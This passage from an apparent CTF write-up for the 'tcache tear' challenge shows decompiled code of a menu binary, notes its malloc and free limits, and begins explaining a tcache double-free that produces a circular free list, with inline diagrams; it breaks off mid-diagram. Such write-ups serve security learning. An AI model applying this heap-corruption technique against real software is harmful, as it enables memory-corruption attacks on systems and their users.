      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
        malloc_m();
      }
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
LAB_00400c75:
        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Invalid choice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
      }
    }
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
      }
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; LAB_00400c75;
    }
    print_buffer();
  } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;malloc_m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
{
  ulong size;
  
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Size:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  size &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;read_ll();
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
    malloced &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;malloc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Data:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    read((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)malloced,(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)size &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Done !&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  }
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The binary reads &lt;code&gt;0x20&lt;&#x2F;code&gt; bytes into a global buffer. Then, it displays a menu:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;blog.srikavin.me&#x2F;posts&#x2F;pwnable-tw-tcache-tear&#x2F;5d99297adf0cde08ea5c061d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We are able to &lt;code&gt;malloc&lt;&#x2F;code&gt; arbitrary sizes (under 0x100) and &lt;code&gt;free&lt;&#x2F;code&gt; the last allocated chunk (up to 8 times).&lt;&#x2F;p&gt;
&lt;h1 id=&quot;attacks&quot;&gt;Attacks&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;circular-list&quot;&gt;Circular List&lt;&#x2F;h2&gt;
&lt;p&gt;The given tcache implementation has no checks to detect double frees. Consider the following initial state:&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;552px&quot; height=&quot;352px&quot; viewBox=&quot;-0.5 -0.5 552 352&quot;&gt;&lt;defs&#x2F;&gt;&lt;g&gt;&lt;rect x=&quot;250&quot; y=&quot;301&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 326px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;b&gt;NULL&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;330&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;NULL&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;21&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;33&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;181&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;193&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 1 L 240 1 L 240 141 L 260 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 96 L 305 174.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 1 L 530 1 L 530 141 L 550 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 86 L 233.63 86&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;p&gt;If we call &lt;code&gt;free(0x603260)&lt;&#x2F;code&gt; twice, we add the &lt;code&gt;tcache_entry&lt;&#x2F;code&gt; to the free list again, which results in a circular list:&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;552px&quot; height=&quot;382px&quot; viewBox=&quot;-0.5 -0.5 552 382&quot;&gt;&lt;defs&#x2F;&gt;&lt;g&gt;&lt;rect x=&quot;0&quot; y=&quot;21&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;33&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;181&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;193&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 1 L 240 1 L 240 141 L 260 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 96 L 305 174.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; 